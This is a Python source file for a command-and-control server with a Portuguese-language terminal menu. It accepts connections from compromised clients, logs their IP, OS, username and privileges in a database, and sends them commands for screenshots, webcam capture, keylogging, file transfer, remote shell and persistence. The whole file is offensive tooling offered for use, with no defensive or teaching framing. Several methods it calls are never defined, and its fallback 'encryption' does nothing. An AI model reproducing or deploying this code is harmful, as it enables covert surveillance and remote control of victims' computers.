#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import socket
import threading
import json
import base64
import hashlib
import sqlite3
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from pathlib import Path

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
from rich.syntax import Syntax
from rich.style import Style
from rich.box import ROUNDED
from rich.layout import Layout
from rich.live import Live

console = Console()

class C2Server:
    def __init__(self):
        self.banner = self._gerar_banner_c2()
        self.config = {
            'host': '0.0.0.0',
            'port': 8080,
            'max_clients': 100,
            'timeout': 30,
            'database_file': 'c2_server.db',
            'log_file': 'c2_activity.log',
            'password_hash': None,
            'auto_start': False,
            'encryption_key': Fernet.generate_key() if Fernet else None
        }
        
        self.clients = {}  # ID -> Client info
        self.server_socket = None
        self.running = False
        self.db_conn = None
        
        # Comandos disponíveis
        self.commands = {
            'system_info': 'Obter informações do sistema',
            'screenshot': 'Capturar tela (se disponível)',
            'webcam': 'Capturar webcam',
            'keylogger': 'Iniciar/Parar keylogger',
            'download': 'Download de arquivo',
            'upload': 'Upload de arquivo',
            'shell': 'Shell remoto',
            'persistence': 'Estabelecer persistência',
            'kill': 'Terminar cliente'
        }
    
    def _gerar_banner_c2(self) -> str:
        return """
[bold red]
╔═╗╔═╗  ╔═╗╔╦╗╔═╗╦═╗╔═╗╔═╗
║ ╦║╣   ║╣ ║║║╠═╣╠╦╝╠═╣║  
╚═╝╚═╝  ╚═╝╩ ╩╩ ╩╩╚═╩ ╩╚═╝
[/bold red]
[bold white on red]        SERVIDOR COMMAND & CONTROL - v3.0[/bold white on red]
[bold yellow]        Central de Comando Elite[/bold yellow]
"""
    
    def _setup_database(self):
        """Configura o banco de dados SQLite"""
        try:
            self.db_conn = sqlite3.connect(self.config['database_file'])
            cursor = self.db_conn.cursor()
            
            # Tabela de clientes
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS clients (
                    id TEXT PRIMARY KEY,
                    ip TEXT,
                    port INTEGER,
                    first_seen TEXT,
                    last_seen TEXT,
                    os TEXT,
                    username TEXT,
                    privileges TEXT,
                    status TEXT
                )
            ''')
            
            # Tabela de comandos
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT,
                    command TEXT,
                    timestamp TEXT,
                    status TEXT,
                    result TEXT,
                    FOREIGN KEY (client_id) REFERENCES clients (id)
                )
            ''')
            
            # Tabela de logs
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS activity_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT,
                    action TEXT,
                    timestamp TEXT,
                    details TEXT
                )
            ''')
            
            self.db_conn.commit()
            
        except Exception as e:
            console.print(f"[red]✗ Erro no banco de dados: {str(e)}[/red]")
    
    def _log_activity(self, client_id: str, action: str, details: str = ""):
        """Registra atividade no log"""
        try:
            cursor = self.db_conn.cursor()
            cursor.execute(
                "INSERT INTO activity_logs (client_id, action, timestamp, details) VALUES (?, ?, ?, ?)",
                (client_id, action, datetime.now().isoformat(), details)
            )
            self.db_conn.commit()
            
            # Também loga no arquivo
            with open(self.config['log_file'], 'a') as f:
                f.write(f"[{datetime.now()}] {client_id} - {action}: {details}\n")
                
        except Exception as e:
            console.print(f"[red]✗ Erro no log: {str(e)}[/red]")
    
    def _generate_client_id(self, client_info: dict) -> str:
        """Gera um ID único para o cliente"""
        unique_str = f"{client_info['ip']}:{client_info['port']}:{time.time()}"
        return hashlib.md5(unique_str.encode()).hexdigest()[:8].upper()
    
    def mostrar_menu_principal(self):
        """Menu principal do C2"""
        while True:
            console.clear()
            console.print(self.banner)
            
            status = "[green]✅ ONLINE[/green]" if self.running else "[red]❌ OFFLINE[/red]"
            clients_count = len(self.clients)
            
            tabela = Table(
                title=f"[bold cyan]🖥️  MENU C2 SERVER {status}[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Opção", style="cyan", width=8)
            tabela.add_column("Função", style="green")
            tabela.add_column("Status", style="yellow")
            
            tabela.add_row("1", "Iniciar Servidor", "🚀 Iniciar C2")
            tabela.add_row("2", "Parar Servidor", "🛑 Parar C2")
            tabela.add_row("3", "Clientes Conectados", f"👥 {clients_count} clientes")
            tabela.add_row("4", "Gerenciar Clientes", "🎯 Comandos remotos")
            tabela.add_row("5", "Monitor em Tempo Real", "📊 Live monitoring")
            tabela.add_row("6", "Configurações", "⚙️ Configurar servidor")
            tabela.add_row("7", "Logs de Atividade", "📋 Histórico")
            tabela.add_row("8", "Banco de Dados", "🗄️ Gerenciar dados")
            tabela.add_row("0", "Sair", "🚪 Fechar C2")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione uma opção",
                choices=[str(i) for i in range(0, 9)],
                show_choices=False
            )
            
            if escolha == "1":
                self._iniciar_servidor()
            elif escolha == "2":
                self._parar_servidor()
            elif escolha == "3":
                self._listar_clientes()
            elif escolha == "4":
                self._gerenciar_clientes()
            elif escolha == "5":
                self._monitor_tempo_real()
            elif escolha == "6":
                self._menu_configuracao()
            elif escolha == "7":
                self._ver_logs()
            elif escolha == "8":
                self._gerenciar_banco_dados()
            elif escolha == "0":
                self._sair()
    
    def _iniciar_servidor(self):
        """Inicia o servidor C2"""
        if self.running:
            console.print("[yellow]⚠️ Servidor já está em execução[/yellow]")
            return
        
        console.print(Panel.fit(
            "[bold green]🚀 INICIANDO SERVIDOR C2[/bold green]",
            border_style="green"
        ))
        
        # Configuração do banco de dados
        self._setup_database()
        
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.config['host'], self.config['port']))
            self.server_socket.listen(self.config['max_clients'])
            self.server_socket.settimeout(1)
            
            self.running = True
            console.print(f"[green]✅ Servidor iniciado em {self.config['host']}:{self.config['port']}[/green]")
            
            # Thread para aceitar conexões
            accept_thread = threading.Thread(target=self._accept_connections, daemon=True)
            accept_thread.start()
            
            console.print("[yellow]🔄 Aguardando conexões de clientes...[/yellow]")
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao iniciar servidor: {str(e)}[/red]")
            self.running = False
        
        input("\nPressione Enter para continuar...")
    
    def _parar_servidor(self):
        """Para o servidor C2"""
        if not self.running:
            console.print("[yellow]⚠️ Servidor não está em execução[/yellow]")
            return
        
        console.print(Panel.fit(
            "[bold red]🛑 PARANDO SERVIDOR C2[/bold red]",
            border_style="red"
        ))
        
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        
        if self.db_conn:
            self.db_conn.close()
        
        console.print("[green]✅ Servidor parado com sucesso[/green]")
        time.sleep(1)
    
    def _accept_connections(self):
        """Aceita conexões de clientes em loop"""
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                client_socket.settimeout(self.config['timeout'])
                
                # Gerar ID único para o cliente
                client_info = {
                    'socket': client_socket,
                    'ip': client_address[0],
                    'port': client_address[1],
                    'connected_at': datetime.now(),
                    'last_activity': datetime.now()
                }
                
                client_id = self._generate_client_id(client_info)
                self.clients[client_id] = client_info
                
                # Registrar no banco de dados
                self._register_client(client_id, client_info)
                
                console.print(f"[green]✅ Novo cliente conectado: {client_id}[/green]")
                console.print(f"   [cyan]IP:[/cyan] {client_address[0]}:{client_address[1]}")
                
                # Thread para lidar com o cliente
                client_thread = threading.Thread(
                    target=self._handle_client,
                    args=(client_id, client_socket),
                    daemon=True
                )
                client_thread.start()
                
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    console.print(f"[red]✗ Erro ao aceitar conexão: {str(e)}[/red]")
    
    def _register_client(self, client_id: str, client_info: dict):
        """Registra cliente no banco de dados"""
        try:
            cursor = self.db_conn.cursor()
            cursor.execute(
                '''INSERT OR REPLACE INTO clients 
                (id, ip, port, first_seen, last_seen, status) 
                VALUES (?, ?, ?, ?, ?, ?)''',
                (
                    client_id,
                    client_info['ip'],
                    client_info['port'],
                    client_info['connected_at'].isoformat(),
                    client_info['last_activity'].isoformat(),
                    'connected'
                )
            )
            self.db_conn.commit()
            self._log_activity(client_id, "CLIENT_CONNECTED", f"IP: {client_info['ip']}:{client_info['port']}")
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao registrar cliente: {str(e)}[/red]")
    
    def _handle_client(self, client_id: str, client_socket: socket.socket):
        """Lida com comunicação do cliente"""
        try:
            while self.running and client_id in self.clients:
                try:
                    # Receber dados do cliente
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    
                    # Processar mensagem
                    message = self._decrypt_data(data)
                    self._process_client_message(client_id, message)
                    
                    # Atualizar última atividade
                    self.clients[client_id]['last_activity'] = datetime.now()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    console.print(f"[red]✗ Erro com cliente {client_id}: {str(e)}[/red]")
                    break
        
        finally:
            self._disconnect_client(client_id)
    
    def _process_client_message(self, client_id: str, message: str):
        """Processa mensagem do cliente"""
        try:
            data = json.loads(message)
            message_type = data.get('type', 'unknown')
            
            if message_type == 'heartbeat':
                self._update_client_status(client_id, 'active')
                
            elif message_type == 'system_info':
                self._update_client_info(client_id, data.get('data', {}))
                
            elif message_type == 'command_result':
                self._process_command_result(client_id, data)
                
            elif message_type == 'file_upload':
                self._receive_file(client_id, data)
                
            else:
                console.print(f"[yellow]⚠️ Mensagem desconhecida de {client_id}: {message_type}[/yellow]")
                
        except json.JSONDecodeError:
            console.print(f"[red]✗ Mensagem inválida de {client_id}[/red]")
        except Exception as e:
            console.print(f"[red]✗ Erro ao processar mensagem: {str(e)}[/red]")
    
    def _send_command(self, client_id: str, command: str, args: dict = None):
        """Envia comando para cliente"""
        if client_id not in self.clients:
            console.print(f"[red]✗ Cliente {client_id} não encontrado[/red]")
            return False
        
        try:
            message = {
                'type': 'command',
                'command': command,
                'args': args or {},
                'timestamp': datetime.now().isoformat()
            }
            
            encrypted = self._encrypt_data(json.dumps(message))
            self.clients[client_id]['socket'].sendall(encrypted)
            
            # Registrar comando no banco de dados
            cursor = self.db_conn.cursor()
            cursor.execute(
                "INSERT INTO commands (client_id, command, timestamp, status) VALUES (?, ?, ?, ?)",
                (client_id, command, datetime.now().isoformat(), 'sent')
            )
            self.db_conn.commit()
            
            self._log_activity(client_id, "COMMAND_SENT", f"{command} - {args}")
            return True
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao enviar comando: {str(e)}[/red]")
            return False
    
    def _listar_clientes(self):
        """Lista clientes conectados"""
        console.clear()
        console.print(Panel.fit(
            "[bold blue]👥 CLIENTES CONECTADOS[/bold blue]",
            border_style="blue"
        ))
        
        if not self.clients:
            console.print("[yellow]⚠️ Nenhum cliente conectado[/yellow]")
            input("\nPressione Enter para continuar...")
            return
        
        tabela = Table(
            show_header=True,
            header_style="bold magenta"
        )
        tabela.add_column("ID", style="cyan", width=10)
        tabela.add_column("IP:Porta", style="green")
        tabela.add_column("Conectado", style="yellow")
        tabela.add_column("Última Atividade", style="white")
        tabela.add_column("Status", style="red")
        
        for client_id, info in self.clients.items():
            connected_time = info['connected_at'].strftime("%H:%M:%S")
            last_activity = info['last_activity'].strftime("%H:%M:%S")
            status = "[green]✅ ATIVO[/green]" if (datetime.now() - info['last_activity']).seconds < 60 else "[yellow]⏰ INATIVO[/yellow]"
            
            tabela.add_row(
                client_id,
                f"{info['ip']}:{info['port']}",
                connected_time,
                last_activity,
                status
            )
        
        console.print(tabela)
        input("\nPressione Enter para continuar...")
    
    def _gerenciar_clientes(self):
        """Menu de gerenciamento de clientes"""
        if not self.clients:
            console.print("[yellow]⚠️ Nenhum cliente conectado[/yellow]")
            time.sleep(1)
            return
        
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold green]🎯 GERENCIAR CLIENTES[/bold green]",
                border_style="green"
            ))
            
            # Listar clientes
            tabela = Table(show_header=True, header_style="bold cyan")
            tabela.add_column("#", style="yellow", width=3)
            tabela.add_column("ID", style="cyan")
            tabela.add_column("IP", style="green")
            tabela.add_column("Status", style="red")
            
            client_list = list(self.clients.keys())
            for i, client_id in enumerate(client_list, 1):
                info = self.clients[client_id]
                status = "[green]✅[/green]" if (datetime.now() - info['last_activity']).seconds < 60 else "[yellow]⏰[/yellow]"
                tabela.add_row(str(i), client_id, info['ip'], status)
            
            tabela.add_row("0", "Voltar", "", "↩️")
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione um cliente",
                choices=[str(i) for i in range(0, len(client_list) + 1)],
                show_choices=False
            )
            
            if escolha == "0":
                return
            
            client_id = client_list[int(escolha) - 1]
            self._menu_comandos_cliente(client_id)
    
    def _menu_comandos_cliente(self, client_id: str):
        """Menu de comandos para cliente específico"""
        while True:
            console.clear()
            console.print(Panel.fit(
                f"[bold cyan]⚡ COMANDOS - CLIENTE {client_id}[/bold cyan]",
                border_style="cyan"
            ))
            
            info = self.clients[client_id]
            console.print(f"[green]IP:[/green] {info['ip']}:{info['port']}")
            console.print(f"[green]Conectado:[/green] {info['connected_at'].strftime('%Y-%m-%d %H:%M:%S')}")
            console.print(f"[green]Última atividade:[/green] {info['last_activity'].strftime('%H:%M:%S')}")
            
            tabela = Table(show_header=True, header_style="bold magenta")
            tabela.add_column("Comando", style="cyan")
            tabela.add_column("Descrição", style="green")
            
            for cmd, desc in self.commands.items():
                tabela.add_row(cmd, desc)
            
            tabela.add_row("back", "Voltar ao menu anterior")
            console.print(tabela)
            
            comando = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Digite o comando",
                default="back"
            )
            
            if comando.lower() == 'back':
                return
            
            if comando in self.commands:
                self._executar_comando(client_id, comando)
            else:
                console.print("[red]✗ Comando não reconhecido[/red]")
                time.sleep(1)
    
    def _executar_comando(self, client_id: str, comando: str):
        """Executa comando no cliente"""
        args = {}
        
        if comando == 'download':
            args['file_path'] = Prompt.ask("[yellow]?[/yellow] Caminho do arquivo para download")
        
        elif comando == 'upload':
            args['file_path'] = Prompt.ask("[yellow]?[/yellow] Caminho do arquivo para upload")
            args['destination'] = Prompt.ask("[yellow]?[/yellow] Destino no cliente")
        
        elif comando == 'shell':
            args['command'] = Prompt.ask("[yellow]?[/yellow] Comando para executar")
        
        success = self._send_command(client_id, comando, args)
        
        if success:
            console.print(f"[green]✅ Comando '{comando}' enviado para {client_id}[/green]")
        else:
            console.print(f"[red]✗ Falha ao enviar comando[/red]")
        
        time.sleep(1)
    
    def _menu_configuracao(self):
        """Menu de configuração do servidor"""
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold cyan]⚙️ CONFIGURAÇÕES DO SERVIDOR[/bold cyan]",
                border_style="cyan"
            ))
            
            tabela = Table(show_header=False)
            tabela.add_row("1", f"Host: {self.config['host']}")
            tabela.add_row("2", f"Porta: {self.config['port']}")
            tabela.add_row("3", f"Máx. Clientes: {self.config['max_clients']}")
            tabela.add_row("4", f"Timeout: {self.config['timeout']}s")
            tabela.add_row("5", f"Arquivo DB: {self.config['database_file']}")
            tabela.add_row("6", f"Arquivo Log: {self.config['log_file']}")
            tabela.add_row("7", f"Auto Iniciar: {'✅' if self.config['auto_start'] else '❌'}")
            tabela.add_row("0", "Voltar")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione para alterar",
                choices=[str(i) for i in range(0, 8)],
                show_choices=False
            )
            
            if escolha == "1":
                self.config['host'] = Prompt.ask(
                    "[yellow]?[/yellow] Digite o host",
                    default=self.config['host']
                )
            elif escolha == "2":
                self.config['port'] = IntPrompt.ask(
                    "[yellow]?[/yellow] Digite a porta",
                    default=self.config['port']
                )
            elif escolha == "3":
                self.config['max_clients'] = IntPrompt.ask(
                    "[yellow]?[/yellow] Máximo de clientes",
                    default=self.config['max_clients']
                )
            elif escolha == "4":
                self.config['timeout'] = IntPrompt.ask(
                    "[yellow]?[/yellow] Timeout (segundos)",
                    default=self.config['timeout']
                )
            elif escolha == "5":
                self.config['database_file'] = Prompt.ask(
                    "[yellow]?[/yellow] Arquivo de banco de dados",
                    default=self.config['database_file']
                )
            elif escolha == "6":
                self.config['log_file'] = Prompt.ask(
                    "[yellow]?[/yellow] Arquivo de log",
                    default=self.config['log_file']
                )
            elif escolha == "7":
                self.config['auto_start'] = Confirm.ask(
                    "[yellow]?[/yellow] Auto iniciar servidor",
                    default=self.config['auto_start']
                )
            elif escolha == "0":
                return
    
    def _monitor_tempo_real(self):
        """Monitor em tempo real das conexões"""
        if not self.clients:
            console.print("[yellow]⚠️ Nenhum cliente conectado[/yellow]")
            time.sleep(1)
            return
        
        console.clear()
        console.print(Panel.fit(
            "[bold green]📊 MONITOR EM TEMPO REAL[/bold green]",
            border_style="green"
        ))
        console.print("[yellow]Pressione Ctrl+C para voltar[/yellow]")
        
        try:
            with Live(refresh_per_second=2) as live:
                while True:
                    layout = Layout()
                    
                    # Header
                    header = Panel.fit(
                        f"[bold]C2 SERVER - Clientes Conectados: {len(self.clients)}[/bold]",
                        style="blue"
                    )
                    layout.split_column(header, Layout(name="main"))
                    
                    # Tabela de clientes
                    tabela = Table(show_header=True, header_style="bold magenta")
                    tabela.add_column("ID", style="cyan", width=10)
                    tabela.add_column("IP", style="green")
                    tabela.add_column("Atividade", style="yellow")
                    tabela.add_column("Status", style="red")
                    
                    for client_id, info in self.clients.items():
                        inactivity = (datetime.now() - info['last_activity']).seconds
                        status = "[green]✅[/green]" if inactivity < 10 else "[yellow]⏰[/yellow]" if inactivity < 30 else "[red]❌[/red]"
                        tabela.add_row(client_id, info['ip'], f"{inactivity}s", status)
                    
                    layout["main"].update(tabela)
                    live.update(layout)
                    time.sleep(2)
                    
        except KeyboardInterrupt:
            pass
    
    def _ver_logs(self):
        """Exibe logs de atividade"""
        try:
            if not os.path.exists(self.config['log_file']):
                console.print("[yellow]⚠️ Nenhum log encontrado[/yellow]")
                time.sleep(1)
                return
            
            with open(self.config['log_file'], 'r') as f:
                logs = f.readlines()[-20:]  # Últimas 20 linhas
            
            console.print(Panel.fit(
                "[bold blue]📋 ÚLTIMOS LOGS[/bold blue]",
                border_style="blue"
            ))
            
            for log in logs:
                console.print(f"[cyan]{log.strip()}[/cyan]")
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao ler logs: {str(e)}[/red]")
        
        input("\nPressione Enter para continuar...")
    
    def _gerenciar_banco_dados(self):
        """Menu de gerenciamento do banco de dados"""
        console.print(Panel.fit(
            "[bold magenta]🗄️ GERENCIAR BANCO DE DADOS[/bold magenta]",
            border_style="magenta"
        ))
        
        tabela = Table(show_header=False)
        tabela.add_row("1", "Estatísticas do BD")
        tabela.add_row("2", "Exportar Dados")
        tabela.add_row("3", "Limpar Dados Antigos")
        tabela.add_row("0", "Voltar")
        console.print(tabela)
        
        escolha = Prompt.ask(
            "[blink yellow]➤[/blink yellow] Selecione uma opção",
            choices=["0", "1", "2", "3"],
            show_choices=False
        )
        
        if escolha == "1":
            self._mostrar_estatisticas_bd()
        elif escolha == "2":
            self._exportar_dados()
        elif escolha == "3":
            self._limpar_dados_antigos()
    
    def _mostrar_estatisticas_bd(self):
        """Mostra estatísticas do banco de dados"""
        try:
            cursor = self.db_conn.cursor()
            
            # Estatísticas de clientes
            cursor.execute("SELECT COUNT(*) FROM clients")
            total_clients = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM clients WHERE status = 'connected'")
            connected_clients = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM commands")
            total_commands = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM activity_logs")
            total_logs = cursor.fetchone()[0]
            
            console.print(Panel.fit(
                f"""[bold]ESTATÍSTICAS DO BANCO DE DADOS:[/bold]
[cyan]Total de Clientes:[/cyan] {total_clients}
[cyan]Clientes Conectados:[/cyan] {connected_clients}
[cyan]Comandos Executados:[/cyan] {total_commands}
[cyan]Logs de Atividade:[/cyan] {total_logs}
[cyan]Arquivo:[/cyan] {self.config['database_file']}""",
                title="[bold green]ESTATÍSTICAS[/bold green]",
                border_style="green"
            ))
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao obter estatísticas: {str(e)}[/red]")
        
        input("\nPressione Enter para continuar...")
    
    def _encrypt_data(self, data: str) -> bytes:
        """Criptografa dados (simplificado)"""
        if self.config['encryption_key'] and Fernet:
            fernet = Fernet(self.config['encryption_key'])
            return fernet.encrypt(data.encode())
        return data.encode()
    
    def _decrypt_data(self, data: bytes) -> str:
        """Descriptografa dados (simplificado)"""
        if self.config['encryption_key'] and Fernet:
            fernet = Fernet(self.config['encryption_key'])
            return fernet.decrypt(data).decode()
        return data.decode()
    
    def _disconnect_client(self, client_id: str):
        """Desconecta cliente e limpa recursos"""
        if client_id in self.clients:
            try:
                self.clients[client_id]['socket'].close()
            except:
                pass
            
            # Atualizar status no banco de dados
            try:
                cursor = self.db_conn.cursor()
                cursor.execute(
                    "UPDATE clients SET status = 'disconnected', last_seen = ? WHERE id = ?",
                    (datetime.now().isoformat(), client_id)
                )
                self.db_conn.commit()
                self._log_activity(client_id, "CLIENT_DISCONNECTED")
            except Exception as e:
                console.print(f"[red]✗ Erro ao atualizar BD: {str(e)}[/red]")
            
            del self.clients[client_id]
            console.print(f"[yellow]📴 Cliente {client_id} desconectado[/yellow]")
    
    def _sair(self):
        """Procedimento de saída"""
        if self.running:
            self._parar_servidor()
        
        console.print(Panel.fit(
            "[blink bold red]⚠️ SERVIDOR C2 ENCERRADO ⚠️[/blink bold red]",
            border_style="red"
        ))
        time.sleep(1)
        sys.exit(0)

# Classe Fernet fallback para quando não estiver disponível
class Fernet:
    @staticmethod
    def generate_key():
        return base64.urlsafe_b64encode(os.urandom(32))
    
    def __init__(self, key):
        self.key = key
    
    def encrypt(self, data):
        return data
    
    def decrypt(self, data):
        return data

def main():
    c2_server = C2Server()
    c2_server.mostrar_menu_principal()

if __name__ == '__main__':
    main()
